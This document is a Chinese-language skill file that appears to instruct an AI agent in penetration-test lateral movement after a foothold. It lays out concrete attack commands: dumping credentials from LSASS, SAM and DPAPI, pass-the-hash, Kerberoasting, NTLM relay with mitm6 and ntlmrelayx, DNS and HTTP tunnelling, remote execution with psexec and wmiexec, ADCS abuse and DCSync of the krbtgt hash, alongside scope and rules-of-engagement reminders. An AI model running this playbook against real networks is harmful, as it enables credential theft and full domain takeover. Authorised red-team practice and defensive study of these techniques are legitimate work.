---
name: lateral-movement
description: 当已经拿到一个立足点、要往内网其他主机/域内推进时调用——凭据收割与爆破（SAM/LSASS/DPAPI/Kerberos/NTLM relay）、隧道与代理链（SSH/DNS/ICMP/HTTP）、端口转发、横向执行（SMB/WMI/WinRM/PsExec/SSH）、域内提权路径（Kerberoast/AS-REP/委派/ACL/ADCS）。命中场景：拿到 shell 后不知道下一步 / 内网只有一台能出网 / 想找域管 / 横向一直失败 / 不知道用什么隧道。
---

# 内网横向（lateral-movement）

> **前提**：已经有一个可用立足点（`engagement.phase = foothold`），并且当前主机/网段在项目 scope 内。
> 每一步都记进 `engagement.py hop`，别靠记忆。攻击图用 `engagement.py graph <slug>` 落盘。

## 0. 先做三件事，别急着打第二台

```text
1. 摸清我在哪：hostname / whoami / whoami /priv / ipconfig|ip a / route print|ip route / arp -a
2. 摸清我能到哪：对 10./172.16./192.168. 段做**低速**存活与端口扫描（走 batch_recon 的节流）
3. 摸清我手里有什么：凭据（明文/hash/ticket）、令牌、SSH key、配置文件里的口令
```

闭环判据（说不清就别横向）：**能画出「我 → 下一台」的具体路径：协议 + 端口 + 凭据来源 + 预期权限**。

## 1. 凭据收割（横向的燃料）

| 位置 | Windows | Linux |
| --- | --- | --- |
| 内存 | `lsassy` / `pypykatz lsa minidump` / `procdump -ma lsass.exe` | `/proc/*/environ`、`gcore` 抓 ssh-agent |
| 本地库 | SAM/SYSTEM/LSECURITY（`reg save`）、DPAPI（`dpapi.py`） | `/etc/shadow`（能读就读）、`~/.ssh/id_*`、`~/.bash_history` |
| 配置 | IIS `web.config`、`unattend.xml`、GPP (cpassword)、计划任务参数 | `.env`、`config.php`、`docker-compose.yml`、systemd unit |
| 票据 | `klist`；Kirbi/ccache 文件 | Kerberos keytab |
| 浏览器 | Chrome/Edge Login Data、Cookies | 同 |

**纪律**：拿到凭据后**先验证有效性再往下走**（一条 `nxc smb -u -p` 就够），
并且只用于本次 scope；写进 `engagement.py graph` 的 creds 字段时**脱敏**（`user:***`），
原始值只留交付包原始记录。

## 2. 凭据复用与爆破（按侵入性从低到高）

```bash
# ① 复用（首选：0 噪音）
nxc smb 10.0.0.0/24 -u user -p 'pass' --continue-on-success
nxc winrm 10.0.0.5 -u user -p 'pass'
nxc ssh 10.0.0.6 -u user -p 'pass'

# ② 哈希传递（有 NT hash，不需要明文）
nxc smb 10.0.0.5 -u user -H <nthash>

# ③ Kerberos
impacket-GetUserSPNs domain/user:pass -dc-ip 10.0.0.1 -request      # Kerberoast
impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1   # AS-REP
impacket-ticketer / impacket-getST                                  # 票据伪造/委派

# ④ 爆破（**最后手段**，会锁账号、会告警）
nxc smb 10.0.0.5 -u users.txt -p passwords.txt --no-bruteforce
```

判据：**爆破前先确认锁定策略**（`nxc smb --pass-pol`）。会造成账号锁定的尝试，先跟客户确认（写进 `engagement.roe`）。

## 3. NTLM Relay（无明文也能横着走）

前提：目标没开 SMB/LDAP 签名 + 能找到一台会向我们发起 NTLM 认证的主机。

```bash
# 触发端（IPv6 优先：内网往往默认开且没人管）
mitm6 -d domain.local
# 或 poisoned DNS / 文件上传配合
# 中继端
impacket-ntlmrelayx -tf targets.txt -smb2support -socks     # -socks 便于后续复用会话
```

**闭环判据**：中继成功 = 拿到了目标机上的实际权限（`-socks` 里能 `shares`/`ls`），
而不是"捕获到了 NTLM 认证"。

## 4. 隧道与代理链（内网只有一台出网时）

| 场景 | 首选 | 命令要点 |
| --- | --- | --- |
| 有 SSH | `ssh -D 1080` / `ssh -L` / `ssh -R` | 最稳、最不显眼；`-N -f` 常驻 |
| 只有 HTTP 出网 | `chisel` / `frp` / 反向上线 | 服务端在内、客户端在外，走 443 混流量 |
| 只有 DNS 出网 | `dnscat2` / `iodine` | 慢但难拦；注意 DNS 日志会留痕 |
| 只有 ICMP | `ptunnel-ng` | 兜底 |
| Windows 无工具 | `netsh interface portproxy` / PowerShell `New-PSSession -ComputerName` | 原生，少落地文件 |
| 多层网络 | `proxychains4` + 链式 `-D` | 每跳记进攻击图，否则两层之后就迷路 |

**做隧道时先写清楚**：从哪台到哪台、走的什么协议端口、出口在哪 —— 这是报告「攻击路径复盘」的素材。

## 5. 横向执行（选哪个协议看防守）

| 方式 | 命令 | 留痕/风险 |
| --- | --- | --- |
| SMB（PsExec 类） | `impacket-psexec` / `nxc smb -x` | 会建服务，EDR 敏感 |
| WMI | `impacket-wmiexec` / `nxc smb -x` | 只跑进程，较少落地文件 |
| WinRM | `nxc winrm -x` / `Enter-PSSession` | 走 5985/5986，日志在 WinRM 事件里 |
| DCOM | `impacket-dcomexec` | 备选 |
| Schtasks | `impacket-atexec` | 建计划任务，留痕明显 |
| SSH | 直接 `ssh user@host` | 最安静 |

**先测通协议再选方式**：`nxc smb/winrm/mssql/rdp <host>` 一把看完能走哪条路。

## 6. 域内提权路径（从普通域用户到域管）

按投入产出比排序，**每条都要先确认可达**：

1. **ADCS 滥用**（ESC1-ESC8）：`certipy find -u user -p pass -dc-ip DC` → `certipy req/ auth`
   —— 近年最常见的一条域管路径。
2. **Kerberoast → 破解 → 域管服务账号**：`GetUserSPNs` + `hashcat -m 13100`。
3. **AS-REP Roasting**（不需要预认证的账号）：`GetNPUsers` + `hashcat -m 18200`。
4. **委派**（非约束/约束/RBCD）：`findDelegation.py` → 铸票 `getST`。
5. **ACL 滥用**：BloodHound/`bloodhound-python` 采集 → 找 `GenericAll`/`WriteDacl`/`ForceChangePassword`。
6. **GPP / LAPS / 脚本里的口令**：`nxc smb -M gpp_password` `-M laps`。
7. **zerologon / noPac / PrintNightmare 类**：只在版本匹配且客户允许时用（可能致 DC 不稳定）。

**闭环判据**：拿到**域管的实际权限证据**（DCSync 出 krbtgt hash / 读到了域管才能读的共享），
不是"BloodHound 显示有路径"。

## 7. 死法（早停，别浪费时间）

- 目标开了 SMB 签名 + LDAP 签名 + 无 ADCS 误配 ⇒ 放弃 relay 路线。
- 全内网仅允许 443 出网且无域 ⇒ 优先看 Web 应用横向（同凭据跨系统复用）。
- 爆破触发锁定 ⇒ 立刻停手，改走凭据复用/钓鱼（若 ROE 允许社工，见项目约定）。
- 只有一台可打、无第二台存活 ⇒ 横向不成立，回到 `escalate`（本机提权）与 `exfil`（影响证明）。

## 8. 记账（每跳都要）

```bash
$py scripts/engagement.py hop <slug> --action "nxc smb 10.0.0.0/24 复用 creds" \
      --result "3 台可登录，其中 10.0.0.7 是跳板"
$py scripts/engagement.py lead <slug> --id L7 --what "10.0.0.7 上有到核心区的路由" --status open
$py scripts/engagement.py graph <slug>       # 更新攻击图
```
